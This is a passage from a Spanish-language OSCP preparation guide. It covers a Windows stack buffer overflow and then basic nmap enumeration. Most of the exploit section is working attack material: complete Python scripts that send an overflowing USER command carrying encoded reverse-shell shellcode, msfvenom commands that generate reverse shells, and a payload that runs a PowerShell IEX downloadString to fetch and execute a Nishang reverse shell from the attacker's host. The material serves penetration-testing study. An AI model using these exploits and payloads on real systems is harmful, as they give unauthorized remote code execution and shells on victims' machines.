"\x72\x79\x1a\xf7\x82\xf4\x07\xa0\xd5\x51\xf9\xb9\xb3\x4f\xa0"
"\x13\xa1\x8d\x34\x5b\x61\x4a\x85\x62\x68\x1f\xb1\x40\x7a\xd9"
"\x3a\xcd\x2e\xb5\x6c\x9b\x98\x73\xc7\x6d\x72\x2a\xb4\x27\x12"
"\xab\xf6\xf7\x64\xb4\xd2\x81\x88\x05\x8b\xd7\xb7\xaa\x5b\xd0"
"\xc0\xd6\xfb\x1f\x1b\x53\x0b\x6a\x01\xf2\x84\x33\xd0\x46\xc9"
"\xc3\x0f\x84\xf4\x47\xa5\x75\x03\x57\xcc\x70\x4f\xdf\x3d\x09"
"\xc0\x8a\x41\xbe\xe1\x9e")

buffer = "A"*809 + "B"*4 + "\x90"*16 + shellcode + "C"*(1300-809-4-16-351)

ipAddress = sys.argv[1]

port = 4000

try:
  print "Enviando búffer..."
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ipAddress, port))
  s.recv(1024)
  s.send("USER " + buffer + '\r\n')
  s.recv(1024)
  s.close()
except:
  print "\nError de conexión...\n"
  sys.exit(0)

```
La razón por la cual se han insertado los **NOP-sled** (\x90) antes de nuestro Shellcode, es porque el Shellcode necesita un margen de espacio para ser decodificado antes de ser interpretado, pues hemos usado el encoder x86/shikata_ga_nai. Una buena practica es aprovechar el **Immunity Debugger** para analizar instrucción a instrucción cómo se va produciendo el proceso de decodificación, así como probar a no insertar los NOP-sled a fin de corroborar como la ejecución de nuestro Shellcode no es funcional.

Ya teniendo todo esto hecho, lo único que queda es encontrar una dirección de salto al registro ESP.

#### Salto al ESP

Llegando casi al final, para redirigir el flujo del programa y conseguir una ejecución exitosa de nuestro Shellcode, dado que nuestro Shellcode se sitúa en el registro **ESP** por un lado y dado que tenemos el control del registro **EIP** por otro... la idea es hacer que el registro **EIP** apunte hacia el registro **ESP**.

Para ello, no es tan simple como especificar en _Little Endian_ la dirección del registro **ESP**, pues no funcionará. Lo que tendremos que hacer es lograr que el registro EIP apunte hacia una dirección de la memoria con permisos de ejecución y **ASLR** desactivado donde se aplique una instrucción de tipo '**jmp ESP**'. De esta forma, conseguiremos tras apuntar a dicha dirección, que la siguiente instrucción a realizar corresponda a los **NOP's** iniciales del registro **ESP** hasta llegar a nuestro **Shellcode**.

Para ello, lo que tendremos que hacer una vez sincronizados al proceso desde **Immunity Debugger**, es aplicar el siguiente comando en la línea de comandos interactiva de la herramienta:

`!mona modules`

Una vez hecho, se nos listarán un puñado de módulos, de entre los cuales deberemos buscar cuáles no poseen mecanismos de protección y tienen el ASLR desactivado. Para la examinación del OSCP, siempre habrá uno que reúna dichas condiciones.

Tras encontrar el módulo, desde las pestañas superiores en **Immunity Debugger** (las letras iniciales), una de ellas nos permite visualizar si el campo _.text_ del módulo en la memoria tiene permisos de ejecución, en caso de ser así, el módulo seleccionado es un candidato perfecto.

La idea una vez teniendo el módulo candidato, es ver en qué porción de la memoria se está aplicando un salto al registro ESP. Para realizar esta búsqueda, analizamos el equivalente OPCode de la instrucción haciendo uso para ello de la utilidad **nasm_shell.rb** de Metasploit:

```bash
$~ /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb

nasm > jmp esp
00000000  FFE4              jmp esp
nasm >

```

Sabiendo que a nivel de OPCode, un '**jmp ESP**' figura como **FFE4**, podemos a continuación desde Mona en la línea de comandos interactiva de **Immunity Debugger** realizar la siguiente consulta en la sección de módulos:

`find -s "\xff\xe4" -m modulo.dll`

Suponiendo que se trata de una dll el módulo candidato que hemos encontrado. De manera inmediata, se nos datarán un listado de resultados, donde de entre ellos... deberemos seleccionar aquel cuya dirección de memoria no posea badchars.

Haciendo doble-click en la misma, podremos ver desde la interfaz principal de **Immunity Debugger** como dicha dirección equivale a un jmp ESP. A modo de ejemplo, suponiendo que la dirección es **0x12131415**, se deberían de aplicar al script los siguientes cambios:

```python
#!/usr/bin/python
# coding: utf-8

import sys,socket

if len(sys.argv) != 2:
  print "\nUso: python" + sys.argv[0] + " <dirección-ip>\n"
  sys.exit(0)

shellcode = ("\xba\xfc\xb2\xc0\x24\xdb\xd3\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
"\x52\x83\xc7\x04\x31\x57\x0e\x03\xab\xbc\x22\xd1\xaf\x29\x20"
"\x1a\x4f\xaa\x45\x92\xaa\x9b\x45\xc0\xbf\x8c\x75\x82\xed\x20"
"\xfd\xc6\x05\xb2\x73\xcf\x2a\x73\x39\x29\x05\x84\x12\x09\x04"
"\x06\x69\x5e\xe6\x37\xa2\x93\xe7\x70\xdf\x5e\xb5\x29\xab\xcd"
"\x29\x5d\xe1\xcd\xc2\x2d\xe7\x55\x37\xe5\x06\x77\xe6\x7d\x51"
"\x57\x09\x51\xe9\xde\x11\xb6\xd4\xa9\xaa\x0c\xa2\x2b\x7a\x5d"
"\x4b\x87\x43\x51\xbe\xd9\x84\x56\x21\xac\xfc\xa4\xdc\xb7\x3b"
"\xd6\x3a\x3d\xdf\x70\xc8\xe5\x3b\x80\x1d\x73\xc8\x8e\xea\xf7"
"\x96\x92\xed\xd4\xad\xaf\x66\xdb\x61\x26\x3c\xf8\xa5\x62\xe6"
"\x61\xfc\xce\x49\x9d\x1e\xb1\x36\x3b\x55\x5c\x22\x36\x34\x09"
"\x87\x7b\xc6\xc9\x8f\x0c\xb5\xfb\x10\xa7\x51\xb0\xd9\x61\xa6"
"\xb7\xf3\xd6\x38\x46\xfc\x26\x11\x8d\xa8\x76\x09\x24\xd1\x1c"
"\xc9\xc9\x04\xb2\x99\x65\xf7\x73\x49\xc6\xa7\x1b\x83\xc9\x98"
"\x3c\xac\x03\xb1\xd7\x57\xc4\xc1\x27\x57\x15\x56\x2a\x57\x14"
"\x1d\xa3\xb1\x7c\x71\xe2\x6a\xe9\xe8\xaf\xe0\x88\xf5\x65\x8d"
"\x8b\x7e\x8a\x72\x45\x77\xe7\x60\x32\x77\xb2\xda\x95\x88\x68"
"\x72\x79\x1a\xf7\x82\xf4\x07\xa0\xd5\x51\xf9\xb9\xb3\x4f\xa0"
"\x13\xa1\x8d\x34\x5b\x61\x4a\x85\x62\x68\x1f\xb1\x40\x7a\xd9"
"\x3a\xcd\x2e\xb5\x6c\x9b\x98\x73\xc7\x6d\x72\x2a\xb4\x27\x12"
"\xab\xf6\xf7\x64\xb4\xd2\x81\x88\x05\x8b\xd7\xb7\xaa\x5b\xd0"
"\xc0\xd6\xfb\x1f\x1b\x53\x0b\x6a\x01\xf2\x84\x33\xd0\x46\xc9"
"\xc3\x0f\x84\xf4\x47\xa5\x75\x03\x57\xcc\x70\x4f\xdf\x3d\x09"
"\xc0\x8a\x41\xbe\xe1\x9e")

buffer = "A"*809 + "\x15\x14\x13\x12" + "\x90"*16 + shellcode + "C"*(1300-809-4-16-351)

ipAddress = sys.argv[1]

port = 4000

try:
  print "Enviando búffer..."
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ipAddress, port))
  s.recv(1024)
  s.send("USER " + buffer + '\r\n')
  s.recv(1024)
  s.close()
except:
  print "\nError de conexión...\n"
  sys.exit(0)

```

Consiguiendo así que el registro **EIP** apunte a dicha dirección donde posteriormente se aplica el salto al registro **ESP**.

Una manera más elegante y opcional de hacer las cosas es importando la siguiente librería en el script:

```python
from struct import pack
```

La funcionalidad del **pack** nos permite poner en formato _Little Endian_ una dirección pasada directamente sin tener que estar haciendo la conversión manualmente. Para ello, se debería adaptar el script a lo que se muestra a continuación:

```python
#!/usr/bin/python
# coding: utf-8

import sys,socket
from struct import pack

if len(sys.argv) != 2:
  print "\nUso: python" + sys.argv[0] + " <dirección-ip>\n"
  sys.exit(0)

shellcode = ("\xba\xfc\xb2\xc0\x24\xdb\xd3\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
"\x52\x83\xc7\x04\x31\x57\x0e\x03\xab\xbc\x22\xd1\xaf\x29\x20"
"\x1a\x4f\xaa\x45\x92\xaa\x9b\x45\xc0\xbf\x8c\x75\x82\xed\x20"
"\xfd\xc6\x05\xb2\x73\xcf\x2a\x73\x39\x29\x05\x84\x12\x09\x04"
"\x06\x69\x5e\xe6\x37\xa2\x93\xe7\x70\xdf\x5e\xb5\x29\xab\xcd"
"\x29\x5d\xe1\xcd\xc2\x2d\xe7\x55\x37\xe5\x06\x77\xe6\x7d\x51"
"\x57\x09\x51\xe9\xde\x11\xb6\xd4\xa9\xaa\x0c\xa2\x2b\x7a\x5d"
"\x4b\x87\x43\x51\xbe\xd9\x84\x56\x21\xac\xfc\xa4\xdc\xb7\x3b"
"\xd6\x3a\x3d\xdf\x70\xc8\xe5\x3b\x80\x1d\x73\xc8\x8e\xea\xf7"
"\x96\x92\xed\xd4\xad\xaf\x66\xdb\x61\x26\x3c\xf8\xa5\x62\xe6"
"\x61\xfc\xce\x49\x9d\x1e\xb1\x36\x3b\x55\x5c\x22\x36\x34\x09"
"\x87\x7b\xc6\xc9\x8f\x0c\xb5\xfb\x10\xa7\x51\xb0\xd9\x61\xa6"
"\xb7\xf3\xd6\x38\x46\xfc\x26\x11\x8d\xa8\x76\x09\x24\xd1\x1c"
"\xc9\xc9\x04\xb2\x99\x65\xf7\x73\x49\xc6\xa7\x1b\x83\xc9\x98"
"\x3c\xac\x03\xb1\xd7\x57\xc4\xc1\x27\x57\x15\x56\x2a\x57\x14"
"\x1d\xa3\xb1\x7c\x71\xe2\x6a\xe9\xe8\xaf\xe0\x88\xf5\x65\x8d"
"\x8b\x7e\x8a\x72\x45\x77\xe7\x60\x32\x77\xb2\xda\x95\x88\x68"
"\x72\x79\x1a\xf7\x82\xf4\x07\xa0\xd5\x51\xf9\xb9\xb3\x4f\xa0"
"\x13\xa1\x8d\x34\x5b\x61\x4a\x85\x62\x68\x1f\xb1\x40\x7a\xd9"
"\x3a\xcd\x2e\xb5\x6c\x9b\x98\x73\xc7\x6d\x72\x2a\xb4\x27\x12"
"\xab\xf6\xf7\x64\xb4\xd2\x81\x88\x05\x8b\xd7\xb7\xaa\x5b\xd0"
"\xc0\xd6\xfb\x1f\x1b\x53\x0b\x6a\x01\xf2\x84\x33\xd0\x46\xc9"
"\xc3\x0f\x84\xf4\x47\xa5\x75\x03\x57\xcc\x70\x4f\xdf\x3d\x09"
"\xc0\x8a\x41\xbe\xe1\x9e")

buffer = "A"*809 + "B"*4 + pack('<L', 0x12131415) + shellcode + "C"*(1300-809-4-16-351)

ipAddress = sys.argv[1]

port = 4000

try:
  print "Enviando búffer..."
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ipAddress, port))
  s.recv(1024)
  s.send("USER " + buffer + '\r\n')
  s.recv(1024)
  s.close()
except:
  print "\nError de conexión...\n"
  sys.exit(0)

```

Podemos establecer **BreakPoints** desde Immunity Debugger en dicha dirección (pulsando **F2** para ello sobre la dirección), a fin de corroborar que se produce una detención en la ejecución del programa tras el registro **EIP** pasar por la dirección **0x12131415**. En caso de ser así, esto quiere decir que todo ha sido configurado correctamente, donde de pulsar la tecla **F8** una vez alcanzado el breakpoint, vemos que la siguiente instrucción a realizar corresponde al primer **NOP-sled** del registro **ESP**.

Ya con todo esto hecho, tras la ejecución del exploit teniendo una sesión de escucha previa con netcat en el puerto definido... ganaremos acceso al sistema, con la desventaja de que una vez matada la sesión, en caso de volver a ejecutar el script... no ganaremos más veces acceso al sistema, pues el servicio corrompe. Arreglaremos esto en el siguiente punto.


#### Mejorando el Exploit

De forma opcional, en caso de querer tras la ejecución del exploit poder continuamente acceder al sistema sin que el servicio corrompa, lo único que tenemos que hacer como variante al generar nuestro shellcode es lo siguiente:

```
$~ msfvenom -p windows/shell_reverse_tcp lhost=127.0.0.1 lport=443 EXITFUNC=thread -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f c
```
De esta forma, variamos la función de salida a un modo hilo... haciendo que lo que muera sea el hilo en vez del proceso padre. El Shellcode generado tendrá el mismo tamaño (351 bytes), lo único que habrá que hacer será sutituir el Shellcode por el nuevo generado desde msfvenom.

Tras su ejecución, se podrá comprobar como independientemente del número de veces que se ejecute el exploit, ganaremos siempre acceso al sistema.

#### Reduciendo el Size y Acceso por Powershell

En caso de que nuestro **Size** en el **ESP** antes de que el servicio crashee de otra forma no llegue a los 351 bytes, podemos utilizar un pequeño truco que obtuve haciendo pruebas para reducir el tamaño de nuestro Shellcode.

La idea para este caso, va a ser obtener una sesión reversa TCP vía **Powershell** aprovechando la utilidad de **Nishang**, concretamente la utilidad **Invoke-PowerShellTcp.ps1**. Dado que resultaría tedioso transferir el script, posteriormente dar una instrucción de importación y luego otra de invocación... lo que haremos será hacerlo todo de una, añadiendo en la última línea del script el siguiente contenido:

`Invoke-PowerShellTcp -Reverse -IPAddress nuestraIP -Port 443`

De esta forma, nos aprovecharemos de **msfvenom** para generar una sentencia como la siguiente:

```bash
$~ msfvenom -p windows/exec CMD="powershell IEX(New-Object Net.WebClient).downloadString('http://127.0.0.1:8000/PS.ps1')" -f c -a x86 --platform windows EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00\x0a\x0d"

Payload size: 299 bytes
Final size of c file: 1280 bytes
unsigned char buf[] = 
"\xd9\xcb\xbf\xbe\xfd\xc8\xaf\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
"\x45\x31\x7e\x17\x03\x7e\x17\x83\x50\x01\x2a\x5a\x50\x12\x29"
"\xa5\xa8\xe3\x4e\x2f\x4d\xd2\x4e\x4b\x06\x45\x7f\x1f\x4a\x6a"
"\xf4\x4d\x7e\xf9\x78\x5a\x71\x4a\x36\xbc\xbc\x4b\x6b\xfc\xdf"
"\xcf\x76\xd1\x3f\xf1\xb8\x24\x3e\x36\xa4\xc5\x12\xef\xa2\x78"
"\x82\x84\xff\x40\x29\xd6\xee\xc0\xce\xaf\x11\xe0\x41\xbb\x4b"
"\x22\x60\x68\xe0\x6b\x7a\x6d\xcd\x22\xf1\x45\xb9\xb4\xd3\x97"
"\x42\x1a\x1a\x18\xb1\x62\x5b\x9f\x2a\x11\x95\xe3\xd7\x22\x62"
"\x99\x03\xa6\x70\x39\xc7\x10\x5c\xbb\x04\xc6\x17\xb7\xe1\x8c"
"\x7f\xd4\xf4\x41\xf4\xe0\x7d\x64\xda\x60\xc5\x43\xfe\x29\x9d"
"\xea\xa7\x97\x70\x12\xb7\x77\x2c\xb6\xbc\x9a\x39\xcb\x9f\xf0"
"\xbc\x59\x9a\xb7\xbf\x61\xa4\xe7\xd7\x50\x2f\x68\xaf\x6c\xfa"
"\xcc\x4f\x8f\x2e\x39\xf8\x16\xbb\x80\x65\xa9\x16\xc6\x93\x2a"
"\x92\xb7\x67\x32\xd7\xb2\x2c\xf4\x04\xcf\x3d\x91\x2a\x7c\x3d"
"\xb0\x5a\xed\xb6\x5e\xe8\x82\x50\xc4\x60\x09\x81\x4f\x3d\x89"
"\xe9\x01\xd8\x5e\xc7\xd2\x40\xcb\x72\x8e\xf0\x2b\x33\x35\x8c"
"\x05\x9c\xd0\x0e\x19\x4e\x72\xab\xf3\xfa\xad\x1d\x68\x6c\xd9"
"\x0f\x1c\x1d\x44\xab\x8f\x95\xf4\x5a\x5e\x31\xd1\xbb\xf6\xc9"
"\x55\xb3\x3c\x1d\xb9\x02\x73\x56\xeb\x54\x5d\xa8\xdd\xa5\x9b"
"\xf0\x11\xf5\xeb\x2f\x02\xa6\x25\x40\xd1\x79\x1d\x89\x15";
```

Como vemos, en este caso en hemos pasado de 351 bytes a 299 bytes. Lo que se debe hacer para acceder al sistema en este caso es simplemente compartir un servidor vía Python en el puerto 8000 (para que desde la máquina se interprete el fichero PS.ps1 [Le hemos cambiado el nombre para reducir los bytes]), y dejar una sesión de escucha vía Netcat por el puerto 443.

Inmediatamente tras ejecutar el script, veremos cómo se recibe un GET desde nuestro servidor web vía Python y cómo en cuestión de segundos ganamos acceso al sistema vía Powershell.

Buffer Overflow Linux
===============================================================================================================================

Pentesting
===============================================================================================================================

En este punto, se detallan técnicas de Pentesting a abordar sobre las máquinas Windows/Linux que se nos presenten.

### General

Bajo este apartado se describirán técnicas de enumeración a realizar sobre los Hosts independientemente del sistema operativo / servicio con el que se trate.

#### Port Scanning

Cada uno tiene su forma de hacer la enumeración de puertos/servicios corriendo bajo un sistema. Yo generalmente suelo seguir estos pasos.

* Escaneo inicial de puertos abiertos sobre el sistema

```bash
nmap -p- --open -T5 -v -oG allPorts ipHost -n
```
* Enumeración del servicio y versionado para los puertos descubiertos sobre el sistema

```bash
nmap -p$(cat allPorts | grep -oP '\d{2,5}/open' | awk '{print $1}' FS="/" | xargs | tr ' ' ',') -sC -sV ipHost -oN targeted
```

La razón de hacer esto es que me parece mucho más ágil el poder tener una visual de los puertos abiertos de un primer tirón para el escaneo inicial, así en lo que posteriormente lanzo el profundo de enumeración de servicios con los scripts básicos de enumeración, puedo ir enumerando por mi cuenta los puertos que corren servicios conocidos (HTTP, HTTPS, FTP, ms-sql-s, etc.).

* En caso de contar con un escaneo inicial lento, suelo aplicar la siguiente variante

```bash
nmap -A -T4 -v ipHost -oN misc
```

Este escaneo no engloba todos los puertos, y probablemente nos estemos saltando algunos interesantes que escapen de este escaneo. En tal caso podemos ir englobando rangos de búsqueda a fin de determinar los puertos que están abiertos (Pues lanzando el -p- cuando se demora mucho tiempo nmap suele detener el escaneo haciéndolo incompleto):

```bash
nmap -p1-10000 --open -T5 -v ipHost -n -oG range1-10000
nmap -p10000-20000 --open -T5 -v ipHost -n -oG range10000-20000
nmap -p20000-30000 --open -T5 -v ipHost -n -oG range20000-30000
                        .
                        .
                        .
```

En caso de figurar un servicio HTTP corriendo bajo un puerto, podemos aprovecharnos del script **http-enum.nse** de nmap para enumerar directorios y archivos del servicio web (Cuenta con un diccionario pequeño pero nos puede servir para tener una visual rápida sobre los recursos alojados):

```bash
nmap --script=http-enum.nse -p80,443,8080 ipHost -oN webScan
```

* Visualización de categorías para los scripts de nmap

```bash
grep -r categories /usr/share/nmap/scripts/*.nse | grep -oP '".*?"' | sort -u
```

Estas categorías son todas las que nmap posee, pudiendo por ejemplo para un servicio FTP o SMB aplicar las siguientes categorías:

```bash
nmap -p21,445 --script="vuln and safe" ipHost -oN vulnSafeScan
```